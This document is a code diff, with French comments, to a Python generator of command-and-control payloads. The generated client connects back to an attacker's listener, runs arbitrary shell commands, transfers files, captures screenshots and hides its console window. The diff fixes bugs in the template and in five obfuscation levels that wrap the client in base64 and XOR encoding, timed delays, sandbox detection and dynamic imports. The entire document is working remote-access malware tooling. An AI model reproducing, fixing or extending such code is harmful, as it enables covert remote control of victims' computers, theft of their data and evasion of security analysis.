@@ -28,7 +28,8 @@ class C2PayloadGenerator:
 
     def get_full_c2_code(self) -> str:
         """Code C2 complet avec toutes les fonctionnalités"""
-        return f'''
+        # Ne PAS utiliser f-string ici pour éviter les conflits avec PowerShell/autres syntaxes
+        code_template = '''
 import socket
 import subprocess
 import platform
@@ -45,7 +46,8 @@ class C2Client:
         self.port = port
         self.socket = None
         self.running = True
-        self.debug_mode = False  # Set to True to enable debug logging
+        # Debug logging can be enabled at runtime by setting C2_DEBUG=1
+        self.debug_mode = os.getenv('C2_DEBUG') == '1'
         self.debug_file = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_debug.log')
     
     def debug_log(self, msg):
@@ -53,21 +55,21 @@ class C2Client:
         if self.debug_mode:
             try:
                 with open(self.debug_file, 'a') as f:
-                    f.write(f"{{time.strftime('%H:%M:%S')}} - {{msg}}\\n")
+                    f.write("{0} - {1}\\n".format(time.strftime('%H:%M:%S'), msg))
             except:
                 pass
     
     def connect(self):
         """Connect to C2 server"""
         try:
-            self.debug_log(f"Attempting connection to {{self.ip}}:{{self.port}}")
+            self.debug_log("Attempting connection to {0}:{1}".format(self.ip, self.port))
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.socket.settimeout(10)
             self.socket.connect((self.ip, self.port))
             self.debug_log("Connection successful!")
             return True
         except Exception as e:
-            self.debug_log(f"Connection failed: {{str(e)}}")
+            self.debug_log("Connection failed: {0}".format(str(e)))
             return False
     
     def send_json(self, data):
@@ -93,8 +95,8 @@ class C2Client:
             'hostname': platform.node(),
             'platform': platform.system(),
             'user': os.getenv('USERNAME', 'unknown'),
-            'ip': '{self.listener_ip}',
-            'port': {self.listener_port}
+            'ip': self.ip,
+            'port': self.port
         }}
     
     def cmd_execute(self, cmd):
@@ -103,7 +105,7 @@ class C2Client:
             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
             return output.decode('utf-8', errors='ignore')
         except Exception as e:
-            return f"Error: {{str(e)}}"
+            return "Error: {0}".format(str(e))
     
     def cmd_download(self, file_path):
         """Download file"""
@@ -136,10 +138,23 @@ class C2Client:
             import time as t
             filename = f"screenshot_{{int(t.time())}}.png"
             if platform.system() == 'Windows':
-                os.system(f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object {{$bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height);$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size);$bitmap.Save(\\\"{{filename}}\\\");$graphics.Dispose();$bitmap.Dispose();}}" 2>nul')
+                # Utiliser une simple string avec % pour éviter les problèmes d'accolades des f-strings
+                pwsh = (
+                    'powershell -Command '
+                    '"Add-Type -AssemblyName System.Windows.Forms;'
+                    '[System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { '
+                    '$bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); '
+                    '$graphics = [System.Drawing.Graphics]::FromImage($bitmap); '
+                    '$graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size); '
+                    '$bitmap.Save(\\"%s\\"); '
+                    '$graphics.Dispose(); '
+                    '$bitmap.Dispose(); '
+                    '}" 2>nul'
+                )
+                os.system(pwsh % (filename))
             else:
-                # For Linux/Mac
-                os.system(f'import -window root {{filename}} 2>/dev/null')
+                # For Linux/Mac: éviter f-string imbriquée
+                os.system('import -window root %s 2>/dev/null' % (filename))
             
             if os.path.exists(filename):
                 with open(filename, 'rb') as f:
@@ -240,15 +255,35 @@ class C2Client:
                 time.sleep(retry_delay)
 
 if __name__ == '__main__':
+    # Self-test mode for CI (no network, fast exit)
+    try:
+        if ('--self-test' in sys.argv) or (os.getenv('SELFTEST') == '1'):
+            # Minimal checks that don't require network or UI
+            try:
+                import base64, json
+                _ = base64.b64encode(b'ok').decode()
+                # Exit 0 means OK
+                sys.exit(0)
+            except Exception:
+                # Non-zero exit signals failure in CI
+                sys.exit(2)
+    except Exception:
+        # Ignore and continue normal run
+        pass
+
     # Detach from console on Windows
     if sys.platform.startswith('win'):
         import ctypes
         kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
         kernel32.FreeConsole()
-    
-    client = C2Client('{self.listener_ip}', {self.listener_port})
+
+    client = C2Client(__LISTENER_IP__, __LISTENER_PORT__)
     client.run()
 '''
+        # Remplacer les placeholders par les vraies valeurs
+        return code_template.replace("__LISTENER_IP__", repr(self.listener_ip)).replace(
+            "__LISTENER_PORT__", str(self.listener_port)
+        )
 
     def obfuscate_level_1(self, code: str) -> str:
         """Niveau 1: Base64"""
@@ -262,24 +297,26 @@ exec(code)
     def obfuscate_level_2(self, code: str) -> str:
         """Niveau 2: XOR + Base64 + Délais"""
         key = random.randint(1, 255)
-        xored = "".join(chr(ord(c) ^ key) for c in code)
-        encoded = base64.b64encode(xored.encode()).decode()
+        code_bytes = code.encode("utf-8")
+        xored_bytes = bytes(b ^ key for b in code_bytes)
+        encoded = base64.b64encode(xored_bytes).decode("ascii")
         delay = random.randint(1, 3)
 
         return f"""
 import base64, time
 time.sleep({delay})
 key = {key}
-xored = base64.b64decode('{encoded}').decode('latin1')
-code = ''.join(chr(ord(c) ^ key) for c in xored)
+xored = base64.b64decode('{encoded}')
+code = ''.join(chr(b ^ key) for b in xored)
 exec(code)
 """
 
     def obfuscate_level_3(self, code: str) -> str:
         """Niveau 3: Sandbox Detection"""
         key = random.randint(1, 255)
-        xored = "".join(chr(ord(c) ^ key) for c in code)
-        encoded = base64.b64encode(xored.encode()).decode()
+        code_bytes = code.encode("utf-8")
+        xored_bytes = bytes(b ^ key for b in code_bytes)
+        encoded = base64.b64encode(xored_bytes).decode("ascii")
         delay = random.randint(5, 15)
 
         return f"""
@@ -296,16 +333,17 @@ if is_sandboxed():
     sys.exit()
 time.sleep({delay})
 key = {key}
-xored = base64.b64decode('{encoded}').decode('latin1')
-code = ''.join(chr(ord(c) ^ key) for c in xored)
+xored = base64.b64decode('{encoded}')
+code = ''.join(chr(b ^ key) for b in xored)
 exec(code)
 """
 
     def obfuscate_level_4(self, code: str) -> str:
         """Niveau 4: Dynamic Imports"""
         key = random.randint(1, 255)
-        xored = "".join(chr(ord(c) ^ key) for c in code)
-        encoded = base64.b64encode(xored.encode()).decode()
+        code_bytes = code.encode("utf-8")
+        xored_bytes = bytes(b ^ key for b in code_bytes)
+        encoded = base64.b64encode(xored_bytes).decode("ascii")
         delay = random.randint(5, 15)
 
         return f"""
@@ -315,16 +353,17 @@ subprocess_module = __import__('subprocess')
 platform_module = __import__('platform')
 time.sleep({delay})
 key = {key}
-xored = base64.b64decode('{encoded}').decode('latin1')
-code = ''.join(chr(ord(c) ^ key) for c in xored)
+xored = base64.b64decode('{encoded}')
+code = ''.join(chr(b ^ key) for b in xored)
 exec(code)
 """
 
     def obfuscate_level_5(self, code: str) -> str:
         """Niveau 5: MAXIMUM"""
         key = random.randint(1, 255)
-        xored = "".join(chr(ord(c) ^ key) for c in code)
-        encoded = base64.b64encode(xored.encode()).decode()
+        code_bytes = code.encode("utf-8")
+        xored_bytes = bytes(b ^ key for b in code_bytes)
+        encoded = base64.b64encode(xored_bytes).decode("ascii")
         delay = random.randint(3, 8)
 
         return f"""
@@ -341,8 +380,8 @@ def extreme_check():
 extreme_check()
 time.sleep({delay})
 key = {key}
-xored = base64.b64decode('{encoded}').decode('latin1')
-code = ''.join(chr(ord(c) ^ key) for c in xored)
+xored = base64.b64decode('{encoded}')
+code = ''.join(chr(b ^ key) for b in xored)
 exec(code)
 """
 
